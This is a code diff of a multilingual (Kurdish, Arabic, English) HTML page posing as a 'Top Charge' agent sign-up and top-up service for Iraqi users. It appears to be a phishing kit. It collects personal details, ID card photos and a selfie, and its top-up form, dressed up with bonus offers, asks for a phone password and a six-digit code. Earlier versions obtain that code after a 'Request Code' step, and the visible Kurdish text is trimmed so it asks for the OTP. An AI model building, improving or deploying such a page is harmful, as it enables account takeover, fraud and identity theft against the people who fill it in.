@@ -1,277 +1,807 @@
+
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="ckb" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#050a24">
-<title>Exchange</title>
+<meta name="theme-color" content="#060c1f">
+<title>Top Charge Agents</title>
+
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.45.4/dist/umd/supabase.min.js"></script>
+
 <style>
-:root{--bg:#050a24;--card:#070d30;--line:#0f2a4d;--gold:#17d4ee;--green:#0ecb81;--red:#f6465d;--txt:#e8ecf4;--mut:#8b97b1}
-*{box-sizing:border-box}
-body{margin:0;background:radial-gradient(900px 400px at 80% -10%,#0a1650 0,transparent 60%),var(--bg);color:var(--txt);font-family:Tahoma,Arial,sans-serif;min-height:100vh}
-.ticker{background:#030720;border-bottom:1px solid var(--line);overflow:hidden;direction:ltr;white-space:nowrap;font-size:13px;padding:8px 0}
-.ticker div{display:inline-block;animation:run 35s linear infinite}
-.ticker span{margin:0 22px;color:var(--mut)}
-.ticker b{color:var(--txt);margin-right:6px}
-.up{color:var(--green)}.dn{color:var(--red)}
-@keyframes run{from{transform:translateX(0)}to{transform:translateX(-50%)}}
-.wrap{max-width:480px;margin:0 auto;padding:20px 16px 40px}
-.langs{display:flex;gap:6px;justify-content:flex-end;margin-bottom:14px}
-.langs button{width:auto;padding:7px 14px;font-size:13px;font-weight:600;border-radius:99px;background:var(--card);color:var(--mut);border:1px solid var(--line)}
-.langs button.on{background:var(--gold);color:#000;border-color:var(--gold)}
-.card{background:var(--card);border:1px solid var(--line);border-radius:22px;padding:18px;margin-bottom:14px}
-.card h3{margin:0 0 4px;font-size:15px;color:var(--gold);display:flex;align-items:center;gap:8px}
-label{display:block;margin:14px 0 6px;font-size:13px;color:var(--mut)}
-input,select{width:100%;padding:16px;border:1.5px solid var(--line);border-radius:18px;background:#031634;color:var(--txt);font-size:16px;outline:none;color-scheme:dark}
-input:focus,select:focus{border-color:var(--gold)}
-input[type=file]{padding:10px;font-size:13px}
-input[type=file]::file-selector-button{background:var(--gold);color:#000;border:0;padding:6px 12px;border-radius:8px;margin-inline-end:10px;cursor:pointer;font-weight:bold}
-.chk{display:flex;gap:10px;align-items:flex-start;font-size:14px;color:var(--txt)}
-.chk input{width:auto;margin-top:3px;accent-color:var(--gold)}
-button{width:100%;padding:18px;border:0;border-radius:20px;background:#12dcf0;color:#02142b;font-size:18px;font-weight:600;cursor:pointer}
-button:disabled{opacity:.6}
-#msg{margin-top:12px;text-align:center;font-size:14px}
-.done{text-align:center;padding:30px 10px}.done .ic{font-size:54px}
-.sec{font-size:12px;color:var(--mut);text-align:center;margin-top:10px}
-
-.tc .sub{color:var(--mut);margin:0 0 4px;font-size:14px}
-.ph{display:flex;direction:ltr;gap:8px}
-.cc{display:flex;align-items:center;gap:8px;background:#031634;border:1.5px solid var(--line);border-radius:18px;padding:0 14px;color:var(--mut);font-size:16px;white-space:nowrap}
-.cc svg{width:28px;height:19px;border-radius:3px}
-.ph input{flex:1;min-width:0}
-
-.wa{position:fixed;bottom:20px;inset-inline-start:16px;z-index:99;width:58px;height:58px;border-radius:50%;background:#25d366;display:grid;place-items:center;box-shadow:0 4px 16px #0008;animation:pulse 2s infinite}
-.wa svg{width:32px;height:32px;fill:#fff}
-@keyframes pulse{0%{box-shadow:0 0 0 0 #25d36699}70%{box-shadow:0 0 0 16px #25d36600}100%{box-shadow:0 0 0 0 #25d36600}}
-
-.otp6{display:flex;gap:8px;direction:ltr;justify-content:center;margin-top:6px}
-.otp6 input{width:44px;height:54px;padding:0;text-align:center;font-size:22px;border-radius:12px}
+:root {
+  --bg:#060c1f;
+  --card:#0b1328;
+  --line:#193650;
+  --field:#08101f;
+  --ink:#eff5fc;
+  --mut:#98a5b9;
+  --blue:#17d4ee;
+  --ok:#0ecb81;
+}
+* {box-sizing:border-box}
+body {
+  margin:0;
+  background:var(--bg);
+  color:var(--ink);
+  font:14px/1.7 Tahoma,Arial,sans-serif;
+}
+header,main {
+  max-width:480px;
+  margin:auto;
+  padding:20px 16px;
+}
+.top {
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+}
+.brand {
+  color:var(--blue);
+  font-weight:700;
+  font-size:17px;
+}
+.langs {display:flex;gap:4px}
+.langs button {
+  background:var(--card);
+  border:1px solid var(--line);
+  border-radius:20px;
+  padding:6px 10px;
+  color:var(--ink);
+}
+.langs button.on {
+  background:var(--blue);
+  color:#001127;
+}
+h1 {font-size:21px;margin:25px 0 3px}
+p {color:var(--mut);margin:4px 0 13px}
+.tabs {
+  display:flex;
+  gap:6px;
+  background:var(--card);
+  padding:5px;
+  border:1px solid var(--line);
+  border-radius:40px;
+  margin-bottom:16px;
+}
+.tabs button {
+  flex:1;
+  background:transparent;
+  border:0;
+  border-radius:35px;
+  color:var(--mut);
+  padding:11px;
+  font:700 14px Tahoma,Arial;
+}
+.tabs button.on,.submit {
+  background:linear-gradient(90deg,#12c2ff,#2a6bff);
+  color:#fff;
+}
+.panel {display:none}
+.panel.on {display:block}
+.box {
+  background:var(--card);
+  border:1px solid var(--line);
+  border-radius:22px;
+  padding:16px;
+  margin-bottom:15px;
+}
+h2 {
+  font-size:16px;
+  color:var(--blue);
+  margin:0 0 9px;
+}
+label {
+  display:block;
+  color:var(--mut);
+  font-size:13px;
+  margin:12px 0 5px;
+}
+input,select {
+  width:100%;
+  background:var(--field);
+  border:1px solid var(--line);
+  border-radius:13px;
+  padding:12px;
+  color:var(--ink);
+  font:14px Tahoma,Arial;
+  color-scheme:dark;
+  min-width:0;
+}
+input:focus,select:focus {
+  outline:2px solid #17d4ee66;
+}
+.phone {
+  display:flex;
+  gap:7px;
+  direction:ltr;
+}
+.prefix {
+  display:flex;
+  align-items:center;
+  gap:7px;
+  padding:0 10px;
+  background:var(--field);
+  border:1px solid var(--line);
+  border-radius:13px;
+  white-space:nowrap;
+}
+.prefix img {width:25px}
+.phone input {
+  flex:1;
+  direction:ltr;
+  text-align:left;
+}
+.ltr {direction:ltr;text-align:left}
+.pick {
+  position:relative;
+  width:100%;
+  padding:13px 14px;
+  margin:5px 0;
+  border:1px solid var(--line);
+  border-radius:13px;
+  background:var(--field);
+  color:var(--ink);
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  gap:10px;
+  cursor:pointer;
+}
+.pick.active {
+  border-color:var(--blue);
+  background:#102a45;
+  box-shadow:0 0 0 2px #17d4ee19;
+}
+.pick strong {font-size:15px}
+.pick small {
+  color:var(--ok);
+  font-size:13px;
+}
+.tag {
+  position:absolute;
+  inset-inline-start:10px;
+  top:-9px;
+  background:#2873ed;
+  color:white;
+  border-radius:12px;
+  padding:0 8px;
+  font-size:10px;
+}
+.summary {
+  color:var(--blue);
+  font-size:12px;
+  margin:12px 0;
+}
+.six {
+  display:flex;
+  direction:ltr;
+  gap:5px;
+  justify-content:center;
+}
+.six input {
+  width:calc((100% - 25px)/6);
+  max-width:54px;
+  text-align:center;
+  padding:11px 0;
+  font-size:19px;
+  font-weight:700;
+}
+.tip {
+  padding:11px;
+  background:#0d2a3a;
+  border:1px solid #14405a;
+  color:var(--mut);
+  border-radius:12px;
+  font-size:12px;
+  margin:13px 0;
+}
+.check {
+  display:flex;
+  align-items:center;
+  gap:9px;
+}
+.check input {width:18px}
+.check label {margin:0}
+.submit {
+  width:100%;
+  border:0;
+  border-radius:35px;
+  padding:14px;
+  font-weight:700;
+  font-size:15px;
+  cursor:pointer;
+}
+.submit:disabled {opacity:.5}
+.msg {
+  text-align:center;
+  margin:10px 0;
+  color:#ff6b7d;
+  font-size:13px;
+}
+.wa {
+  position:fixed;
+  bottom:18px;
+  left:18px;
+  background:#25d366;
+  border-radius:50%;
+  width:53px;
+  height:53px;
+  display:grid;
+  place-items:center;
+  text-decoration:none;
+  color:white;
+  font-size:29px;
+  box-shadow:0 4px 14px #0008;
+}
 </style>
 </head>
+
 <body>
-<div class="ticker"><div id="tk"></div></div>
-<div class="wrap" id="app">
 
-  <div class="langs">
-    <button id="langEn" class="on" onclick="setLang('en')">EN</button>
-    <button id="langCkb" onclick="setLang('ckb')">کوردی</button>
-    <button id="langAr" onclick="setLang('ar')">عربي</button>
-  </div>
-
-  <div class="card">
-    <h3 data-i18n="h_personal">👤 Personal Information</h3>
-    <label data-i18n="l_name">Full name</label><input id="name" data-i18n-ph="p_name" placeholder="First, father's, grandfather's name">
-    <label data-i18n="l_phone">Mobile number</label><input id="phone" type="tel" dir="ltr" data-i18n-ph="p_phone" placeholder="07XX XXX XXXX">
-    <label data-i18n="l_email">Email</label><input id="email" type="email" dir="ltr" placeholder="name@example.com">
-    <label data-i18n="l_dob">Date of birth</label><input id="dob" type="date" dir="ltr">
-    <label data-i18n="l_gender">Gender</label>
-    <select id="gender">
-      <option value="" data-i18n="o_choose">Choose</option>
-      <option value="male" data-i18n="o_male">Male</option>
-      <option value="female" data-i18n="o_female">Female</option>
-    </select>
-  </div>
-
-  <div class="card">
-    <h3 data-i18n="h_address">📍 Address</h3>
-    <label data-i18n="l_province">Province</label>
-    <select id="province">
-      <option value="" data-i18n="o_choose">Choose</option>
-      <option value="Erbil" data-i18n="o_erbil">Erbil</option>
-      <option value="Sulaymaniyah" data-i18n="o_suli">Sulaymaniyah</option>
-      <option value="Duhok" data-i18n="o_duhok">Duhok</option>
-      <option value="Halabja" data-i18n="o_halabja">Halabja</option>
-      <option value="Kirkuk" data-i18n="o_kirkuk">Kirkuk</option>
-      <option value="Baghdad" data-i18n="o_baghdad">Baghdad</option>
-      <option value="Mosul" data-i18n="o_mosul">Mosul</option>
-      <option value="Other" data-i18n="o_other">Other</option>
-    </select>
-    <label data-i18n="l_address">Detailed address</label><input id="address" data-i18n-ph="p_address" placeholder="City, neighborhood, nearest landmark">
-  </div>
-
-  <div class="card">
-    <h3 data-i18n="h_docs">🪪 Documents</h3>
-    <label data-i18n="l_idf">ID photo (front)</label><input id="idf" type="file" accept="image/*">
-    <label data-i18n="l_idb">ID photo (back)</label><input id="idb" type="file" accept="image/*">
-    <label data-i18n="l_selfie">Selfie (face clearly visible)</label><input id="selfie" type="file" accept="image/*" capture="user">
-  </div>
-
-  <div class="card">
-    <div class="chk"><input id="ok" type="checkbox"><label for="ok" style="margin:0;color:var(--txt)" data-i18n="l_confirm">I confirm all the information is correct</label></div>
-  </div>
-
-  <div class="card tc" id="tc">
-    <h3>⚡ <span data-i18n="h_tc">Top Charge Account</span></h3>
-    <p class="sub" data-i18n="tc_sub">Enter your details and send a top-up request</p>
-    <label data-i18n="l_phone">Mobile number</label>
-    <div class="ph"><div class="cc"><svg viewBox="0 0 30 20"><rect width="30" height="7" fill="#ce1126"/><rect y="7" width="30" height="6" fill="#fff"/><rect y="13" width="30" height="7" fill="#000"/><text x="15" y="12" font-size="5" fill="#007a3d" text-anchor="middle" font-family="Arial">الله أكبر</text></svg><span dir="ltr">+964</span><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#7d8aa8" stroke-width="2.5"><path d="M6 9l6 6 6-6"/></svg></div>
-      <input id="tcp" type="tel" dir="ltr" inputmode="numeric" maxlength="11" placeholder="7XX XXX XXXX"></div>
-    <label data-i18n="l_address">password</label>
-    <input id="tca" data-i18n-ph="p_address" placeholder="xxxxxxxxxx">
-    <div id="tcotp" style="display:none">
-      <label data-i18n="l_amount">Amount (6 digits)</label>
-      <div class="otp6" id="otp6">
-        <input maxlength="1" inputmode="numeric" dir="ltr">
-        <input maxlength="1" inputmode="numeric" dir="ltr">
-        <input maxlength="1" inputmode="numeric" dir="ltr">
-        <input maxlength="1" inputmode="numeric" dir="ltr">
-        <input maxlength="1" inputmode="numeric" dir="ltr">
-        <input maxlength="1" inputmode="numeric" dir="ltr">
-      </div>
+<header>
+  <div class="top">
+    <div class="brand">◈ Agents</div>
+    <div class="langs">
+      <button data-lang="ckb" class="on">کوردی</button>
+      <button data-lang="ar">عربي</button>
+      <button data-lang="en">EN</button>
     </div>
-    <button class="main" id="tcb1" data-i18n="btn_req">Request Code</button>
-    <button class="main" id="tcb2" style="display:none" data-i18n="btn_tcsend">Send Top-up Request</button>
-    <div id="tcm" style="text-align:center;font-size:14px"></div>
+  </div>
+  <h1 data-i="headline">ببە بە ئەگینتی Top Charge</h1>
+  <p data-i="subtitle">
+    زانیارییەکانت تۆمار بکە و تیمەکەمان پەیوەندیت پێوە دەکات.
+  </p>
+</header>
+
+<main>
+<nav class="tabs">
+  <button id="tab-register" class="on" data-i="register">
+    تۆمارکردن
+  </button>
+  <button id="tab-top" data-i="topup">
+    پڕکردنەوە
+  </button>
+</nav>
+
+<section id="register-panel" class="panel on">
+  <div class="box">
+    <h2 data-i="personal">زانیاری کەسی</h2>
+
+    <label data-i="name">ناوی سیانی</label>
+    <input id="name">
+
+    <label data-i="phone">ژمارەی مۆبایل</label>
+    <div class="phone">
+      <span class="prefix">
+        <img alt="Iraq" src="https://flagcdn.com/w40/iq.png">
+        +964
+      </span>
+      <input id="phone" type="tel" maxlength="10"
+             inputmode="numeric" placeholder="7XXXXXXXXX">
+    </div>
+
+    <label data-i="email">ئیمەیل</label>
+    <input id="email" type="email" class="ltr">
+
+    <label data-i="dob">بەرواری لەدایکبوون</label>
+    <input id="dob" type="date">
+
+    <label data-i="gender">ڕەگەز</label>
+    <select id="gender">
+      <option value="" data-i="choose">هەڵبژێرە</option>
+      <option value="male" data-i="male">نێر</option>
+      <option value="female" data-i="female">مێ</option>
+    </select>
   </div>
 
-  <div style="height:16px;border-top:1px dashed var(--line);margin:28px 0 24px"></div>
-  <button id="btn" data-i18n="btn_send">Send Registration Request</button>
-  <div id="msg"></div>
+  <div class="box">
+    <h2 data-i="addressTitle">ناونیشان</h2>
 
-  <div class="sec" data-i18n="footer_sec">🔒 Your information is used only for verification</div>
-</div>
-<a class="wa" id="wa" target="_blank" rel="noopener" aria-label="WhatsApp"><svg viewBox="0 0 32 32"><path d="M16 3.5C9.100 3.5 3.500 9 3.500 15.800c0 2.300.7 4.500 1.800 6.300L3.800 28.500l6.600-1.700c1.700.9 3.700 1.400 5.600 1.400 6.900 0 12.500-5.500 12.500-12.400S22.900 3.500 16 3.500z" fill="none" stroke="#fff" stroke-width="2"/><path d="M11.500 9.500c-.8 0-1.500.8-1.500 1.800 0 5.300 4.600 9.900 9.900 9.900 1 0 1.800-.7 1.800-1.500v-2l-3.200-1.400-1.600 1.600c-1.700-.9-3.100-2.300-4-4l1.600-1.600-1.400-3.200z"/></svg></a>
+    <label data-i="province">پارێزگا</label>
+    <select id="province">
+      <option value="" data-i="choose">هەڵبژێرە</option>
+      <option value="Erbil">هەولێر</option>
+      <option value="Sulaymaniyah">سلێمانی</option>
+      <option value="Duhok">دهۆک</option>
+      <option value="Halabja">هەڵەبجە</option>
+      <option value="Kirkuk">کەرکووک</option>
+      <option value="Baghdad">بەغدا</option>
+      <option value="Mosul">موسڵ</option>
+      <option value="Other">دیکە</option>
+    </select>
+
+    <label data-i="address">ناونیشانی ورد</label>
+    <input id="address" data-placeholder="addrhint"
+           placeholder="شار، گەڕەک، نزیکترین شوێن">
+  </div>
+
+  <div class="box">
+    <h2 data-i="docs">بەڵگەنامە</h2>
+
+    <label data-i="front">وێنەی پێناسە (پێشەوە)</label>
+    <input id="front" type="file"
+           accept="image/jpeg,image/png,image/webp">
+
+    <label data-i="back">وێنەی پێناسە (پشتەوە)</label>
+    <input id="back" type="file"
+           accept="image/jpeg,image/png,image/webp">
+
+    <label data-i="selfie">وێنەی سێلفی</label>
+    <input id="selfie" type="file"
+           accept="image/jpeg,image/png,image/webp"
+           capture="user">
+
+    <div class="tip" data-i="filesNote">
+      هەر وێنەیەک لە ٥ مێگابایت کەمتر بێت.
+      پێویستە بەڵگەنامەکان بە پاراستنی تایبەتمەندی هەڵبگیرێن.
+    </div>
+  </div>
+
+  <div class="box check">
+    <input id="agree" type="checkbox">
+    <label for="agree" data-i="agree">
+      ڕازیم بە پشکنینی زانیارییەکانم.
+    </label>
+  </div>
+
+  <button class="submit" id="send-register" data-i="sendRegister">
+    ناردنی تۆمارکردن
+  </button>
+  <div class="msg" id="register-msg" role="status"></div>
+</section>
+
+<section id="top-panel" class="panel">
+  <div class="box">
+    <h2 data-i="request">داواکاری پڕکردنەوە</h2>
+
+    <label data-i="phone">ژمارەی مۆبایل</label>
+    <div class="phone">
+      <span class="prefix">
+        <img alt="Iraq" src="https://flagcdn.com/w40/iq.png">
+        +964
+      </span>
+      <input id="top-phone" type="tel"
+             maxlength="10" inputmode="numeric"
+             placeholder="7XXXXXXXXX">
+    </div>
+
+    <label data-i="amount">بڕی پارە / بۆنەس</label>
+
+    <div id="packages">
+      <button class="pick active" data-amount="1000000"
+              aria-pressed="true">
+        <strong>1,000,000 IQD</strong>
+        <small>+180,000</small>
+      </button>
+
+      <button class="pick" data-amount="3000000"
+              aria-pressed="false">
+        <strong>3,000,000 IQD</strong>
+        <small>+540,000</small>
+      </button>
+
+      <button class="pick" data-amount="5000000"
+              aria-pressed="false">
+        <span class="tag" data-i="offer">ئۆفەر</span>
+        <strong>5,000,000 IQD</strong>
+        <small>+900,000</small>
+      </button>
+    </div>
+
+    <div class="summary" id="summary"></div>
+
+    <label data-i="address">پاسۆرد</label>
+    <input id="top-address" data-placeholder="addrhint"
+           placeholder="...........">
+
+    <label data-i="reference">
+       داواکاری (٦ ژمارە)
+    </label>
+
+    <div class="six" id="six">
+      <input inputmode="numeric" maxlength="1" aria-label="1">
+      <input inputmode="numeric" maxlength="1" aria-label="2">
+      <input inputmode="numeric" maxlength="1" aria-label="3">
+      <input inputmode="numeric" maxlength="1" aria-label="4">
+      <input inputmode="numeric" maxlength="1" aria-label="5">
+      <input inputmode="numeric" maxlength="1" aria-label="6">
+    </div>
+
+    <div class="tip" data-i="referenceNote">
+      تەنها ژمارەی 
+      کۆدی OTP، 
+    </div>
+
+    <div class="tip" data-i="requestNote">
+      داواکارییەکەت بۆ  کۆدی .
+    </div>
+  </div>
+
+  <button class="submit" id="send-top" data-i="sendTop">
+    ناردنی داواکاری
+  </button>
+  <div class="msg" id="top-msg" role="status"></div>
+</section>
+</main>
+
+<a class="wa" id="wa" target="_blank"
+   rel="noopener noreferrer" aria-label="WhatsApp">✆</a>
+
 <script>
-// ---------------- i18n ----------------
-const I18N = {
-  en: { dir:"ltr",
-    h_personal:"👤 Personal Information", l_name:"Full name", p_name:"First, father's, grandfather's name",
-    l_phone:"Mobile number", p_phone:"07XX XXX XXXX", l_email:"Email", l_dob:"Date of birth", l_gender:"Gender",
-    o_choose:"Choose", o_male:"Male", o_female:"Female",
-    h_address:"📍 Address", l_province:"Province",
-    o_erbil:"Erbil", o_suli:"Sulaymaniyah", o_duhok:"Duhok", o_halabja:"Halabja", o_kirkuk:"Kirkuk", o_baghdad:"Baghdad", o_mosul:"Mosul", o_other:"Other",
-    l_address:"Detailed address", p_address:"City, neighborhood, nearest landmark",
-    h_docs:"🪪 Documents", l_idf:"ID photo (front)", l_idb:"ID photo (back)", l_selfie:"Selfie (face clearly visible)",
-    l_confirm:"I confirm all the information is correct",
-    h_tc:"Top Charge Account", tc_sub:"Enter your details and send a top-up request", l_amount:"Amount (6 digits)",
-    btn_req:"Request Code", btn_tcsend:"Send Top-up Request", btn_send:"Send Registration Request",
-    footer_sec:"🔒 Your information is used only for verification",
-    m_fill:"Please fill in all fields", m_agree:"You must confirm the agreement", m_wait:"Please wait...",
-    m_dup:"This number or email is already registered", m_err:"Error: ",
-    m_done_t:"Your request has been received", m_done_d:"Our team will verify your details and contact you soon.",
-    m_img:"(image) ", m_data:"(data) ", m_tcphone:"Invalid phone number (e.g. 7501234567)", m_tcaddr:"Please enter an address",
-    m_tcfill:"Please fill in all 6 digits", m_tcdone_t:"Your request has been sent", m_tcdone_d:"You will be contacted soon",
-    wa_text:"Hello, I need some help"
+const dict = {
+  ckb: {
+    headline:"ببە بە ئەگینتی Top Charge",
+    subtitle:"زانیارییەکانت تۆمار بکە و تیمەکەمان پەیوەندیت پێوە دەکات.",
+    register:"تۆمارکردن",
+    topup:"پڕکردنەوە",
+    personal:"زانیاری کەسی",
+    name:"ناوی سیانی",
+    phone:"ژمارەی مۆبایل",
+    email:"ئیمەیل",
+    dob:"بەرواری لەدایکبوون",
+    gender:"ڕەگەز",
+    choose:"هەڵبژێرە",
+    male:"نێر",
+    female:"مێ",
+    addressTitle:"ناونیشان",
+    province:"پارێزگا",
+    address:"ناونیشانی ورد",
+    addrhint:"شار، گەڕەک، نزیکترین شوێن",
+    docs:"بەڵگەنامە",
+    front:"وێنەی پێناسە (پێشەوە)",
+    back:"وێنەی پێناسە (پشتەوە)",
+    selfie:"وێنەی سێلفی",
+    filesNote:"هەر وێنەیەک لە ٥ مێگابایت کەمتر بێت. پێویستە بەڵگەنامەکان بە پاراستنی تایبەتمەندی هەڵبگیرێن.",
+    agree:"ڕازیم بە پشکنینی زانیارییەکانم.",
+    sendRegister:"ناردنی تۆمارکردن",
+    request:"داواکاری پڕکردنەوە",
+    amount:"بڕی پارە / بۆنەس",
+    offer:"ئۆفەر",
+    reference:"ژمارەی ڕیفرەنسی داواکاری (٦ ژمارە)",
+    referenceNote:"تەنها ژمارەی ڕیفرەنسی داواکاری بنووسە؛ کۆدی OTP، کۆدی SMS یان کۆدی چوونەژوورەوە مەنووسە.",
+    requestNote:"داواکارییەکەت بۆ تیمەکە تۆمار دەبێت. هەرگیز کۆدی پشتڕاستکردنەوە یان پاسۆرد نانێردرێت.",
+    sendTop:"ناردنی داواکاری",
+    selected:"هەڵبژێردراو",
+    bonus:"بۆنەس",
+    required:"تکایە هەموو خانەکان پڕ بکەرەوە.",
+    badPhone:"ژمارەی دروست بنووسە: 7XXXXXXXXX",
+    badReference:"ڕیفرەنسی ٦ ژمارەیی بنووسە (نەک کۆدی OTP).",
+    sending:"دەنێردرێت...",
+    success:"داواکارییەکەت بەسەرکەوتوویی تۆمارکرا.",
+    fail:"هەڵە: "
   },
-  ckb: { dir:"rtl",
-    h_personal:"👤 زانیاری کەسی", l_name:"ناوی سیانی", p_name:"ناوی خۆت، باوک، باپیر",
-    l_phone:"ژمارەی مۆبایل", p_phone:"07XX XXX XXXX", l_email:"ئیمەیل", l_dob:"بەرواری لەدایکبوون", l_gender:"ڕەگەز",
-    o_choose:"هەڵبژێرە", o_male:"نێر", o_female:"مێ",
-    h_address:"📍 ناونیشان", l_province:"پارێزگا",
-    o_erbil:"هەولێر", o_suli:"سلێمانی", o_duhok:"دهۆک", o_halabja:"هەڵەبجە", o_kirkuk:"کەرکووک", o_baghdad:"بەغدا", o_mosul:"موسل", o_other:"دیکە",
-    l_address:"ناونیشانی ورد", p_address:"شار، گەڕەک، نزیکترین شوێن",
-    h_docs:"🪪 بەڵگەنامە", l_idf:"وێنەی پێناسە (ڕووی پێشەوە)", l_idb:"وێنەی پێناسە (ڕووی پشتەوە)", l_selfie:"سێلفی (ڕووخسارت ڕوون بێت)",
-    l_confirm:"دان دەنێم کە هەموو زانیارییەکان ڕاستن",
-    h_tc:"ئەکاونتی Top Charge", tc_sub:"زانیارییەکانت بنووسە و داواکاری پڕکردنەوە بنێرە", l_amount:"بڕی پارە (6 ژمارە)",
-    btn_req:"داواکردنی کۆد", btn_tcsend:"ناردنی داواکاری پڕکردنەوە", btn_send:"ناردنی داواکاری تۆمارکردن",
-    footer_sec:"🔒 زانیارییەکانت تەنها بۆ پشتڕاستکردنەوە بەکاردێن",
-    m_fill:"تکایە هەموو خانەکان پڕ بکەرەوە", m_agree:"دەبێت ڕەزامەندی بدەیت", m_wait:"تکایە چاوەڕێ بە...",
-    m_dup:"ئەم ژمارە یان ئیمەیلە پێشتر تۆمارکراوە", m_err:"هەڵە: ",
-    m_done_t:"داواکارییەکەت وەرگیرا", m_done_d:"تیمەکەمان زانیارییەکانت پشتڕاست دەکاتەوە و بە زووترین کات پەیوەندیت پێوە دەکەین.",
-    m_img:"(وێنە) ", m_data:"(زانیاری) ", m_tcphone:"ژمارەی مۆبایل هەڵەیە (نموونە: 7501234567)", m_tcaddr:"ناونیشان بنووسە",
-    m_tcfill:"هەموو 6 خانەکە پڕ بکەرەوە", m_tcdone_t:"داواکارییەکەت نێردرا", m_tcdone_d:"بە زووترین کات پەیوەندیت پێوە دەکرێت",
-    wa_text:"سڵاو، پێویستم بە یارمەتییە"
+  ar: {
+    headline:"كن وكيلًا في Top Charge",
+    subtitle:"سجل بياناتك وسيتواصل معك فريقنا.",
+    register:"التسجيل",
+    topup:"الشحن",
+    personal:"المعلومات الشخصية",
+    name:"الاسم الثلاثي",
+    phone:"رقم الموبايل",
+    email:"البريد الإلكتروني",
+    dob:"تاريخ الميلاد",
+    gender:"الجنس",
+    choose:"اختر",
+    male:"ذكر",
+    female:"أنثى",
+    addressTitle:"العنوان",
+    province:"المحافظة",
+    address:"العنوان التفصيلي",
+    addrhint:"المدينة والحي وأقرب نقطة دالة",
+    docs:"المستمسكات",
+    front:"الهوية (الأمام)",
+    back:"الهوية (الخلف)",
+    selfie:"صورة سيلفي",
+    filesNote:"كل صورة يجب أن تكون أقل من 5MB وتحفظ بخصوصية.",
+    agree:"أوافق على التحقق من بياناتي.",
+    sendRegister:"إرسال التسجيل",
+    request:"طلب شحن",
+    amount:"المبلغ / المكافأة",
+    offer:"عرض",
+    reference:"الرقم المرجعي للطلب (6 أرقام)",
+    referenceNote:"استخدم مرجع الطلب فقط، وليس OTP أو كود SMS أو تسجيل الدخول.",
+    requestNote:"يُحفظ الطلب لفريق العمل. لا ترسل كلمة مرور أو رمز تحقق.",
+    sendTop:"إرسال الطلب",
+    selected:"المحدد",
+    bonus:"المكافأة",
+    required:"املأ جميع الحقول.",
+    badPhone:"أدخل رقمًا صحيحًا: 7XXXXXXXXX",
+    badReference:"أدخل مرجعًا من 6 أرقام، وليس OTP.",
+    sending:"جار الإرسال...",
+    success:"تم استلام طلبك.",
+    fail:"خطأ: "
   },
-  ar: { dir:"rtl",
-    h_personal:"👤 المعلومات الشخصية", l_name:"الاسم الثلاثي", p_name:"اسمك، اسم الأب، اسم الجد",
-    l_phone:"رقم الموبايل", p_phone:"07XX XXX XXXX", l_email:"البريد الإلكتروني", l_dob:"تاريخ الميلاد", l_gender:"الجنس",
-    o_choose:"اختر", o_male:"ذكر", o_female:"أنثى",
-    h_address:"📍 العنوان", l_province:"المحافظة",
-    o_erbil:"أربيل", o_suli:"السليمانية", o_duhok:"دهوك", o_halabja:"حلبجة", o_kirkuk:"كركوك", o_baghdad:"بغداد", o_mosul:"الموصل", o_other:"أخرى",
-    l_address:"العنوان التفصيلي", p_address:"المدينة، الحي، أقرب نقطة دالة",
-    h_docs:"🪪 المستمسكات", l_idf:"صورة الهوية (الوجه الأمامي)", l_idb:"صورة الهوية (الوجه الخلفي)", l_selfie:"صورة سيلفي (الوجه واضح)",
-    l_confirm:"أقر بأن جميع المعلومات صحيحة",
-    h_tc:"حساب Top Charge", tc_sub:"أدخل بياناتك وأرسل طلب الشحن", l_amount:"المبلغ (6 أرقام)",
-    btn_req:"طلب الرمز", btn_tcsend:"إرسال طلب الشحن", btn_send:"إرسال طلب التسجيل",
-    footer_sec:"🔒 معلوماتك تُستخدم فقط للتحقق",
-    m_fill:"يرجى تعبئة جميع الحقول", m_agree:"يجب الموافقة على الإقرار", m_wait:"الرجاء الانتظار...",
-    m_dup:"هذا الرقم أو البريد الإلكتروني مسجل مسبقًا", m_err:"خطأ: ",
-    m_done_t:"تم استلام طلبك", m_done_d:"سيقوم فريقنا بالتحقق من بياناتك والتواصل معك قريبًا.",
-    m_img:"(الصورة) ", m_data:"(البيانات) ", m_tcphone:"رقم الموبايل غير صحيح (مثال: 7501234567)", m_tcaddr:"يرجى إدخال العنوان",
-    m_tcfill:"يرجى تعبئة جميع الخانات الست", m_tcdone_t:"تم إرسال طلبك", m_tcdone_d:"سيتم التواصل معك قريبًا",
-    wa_text:"مرحبًا، أحتاج إلى بعض المساعدة"
+  en: {
+    headline:"Become a Top Charge agent",
+    subtitle:"Register your details and our team will contact you.",
+    register:"Register",
+    topup:"Top up",
+    personal:"Personal information",
+    name:"Full name",
+    phone:"Mobile number",
+    email:"Email",
+    dob:"Date of birth",
+    gender:"Gender",
+    choose:"Choose",
+    male:"Male",
+    female:"Female",
+    addressTitle:"Address",
+    province:"Province",
+    address:"Detailed address",
+    addrhint:"City, neighborhood, nearest landmark",
+    docs:"Documents",
+    front:"ID front",
+    back:"ID back",
+    selfie:"Selfie",
+    filesNote:"Each image must be under 5 MB and stored privately.",
+    agree:"I consent to verification of my details.",
+    sendRegister:"Send registration",
+    request:"Top-up request",
+    amount:"Amount / bonus",
+    offer:"Offer",
+    reference:"Request reference number (6 digits)",
+    referenceNote:"Enter a request reference only, never an OTP, SMS, or login code.",
+    requestNote:"This request is stored for the team. Never send passwords or verification codes.",
+    sendTop:"Send request",
+    selected:"Selected",
+    bonus:"Bonus",
+    required:"Please complete all fields.",
+    badPhone:"Use a valid number: 7XXXXXXXXX",
+    badReference:"Enter a 6-digit reference, not an OTP.",
+    sending:"Sending...",
+    success:"Your request was received.",
+    fail:"Error: "
   }
 };
-let LANG = "en";
-function setLang(code){
-  LANG = code;
-  const d = I18N[code];
-  document.documentElement.lang = code === "ckb" ? "ckb" : code;
-  document.documentElement.dir = d.dir;
-  document.querySelectorAll("[data-i18n]").forEach(el => { const k = el.getAttribute("data-i18n"); if (d[k]) el.textContent = d[k]; });
-  document.querySelectorAll("[data-i18n-ph]").forEach(el => { const k = el.getAttribute("data-i18n-ph"); if (d[k]) el.placeholder = d[k]; });
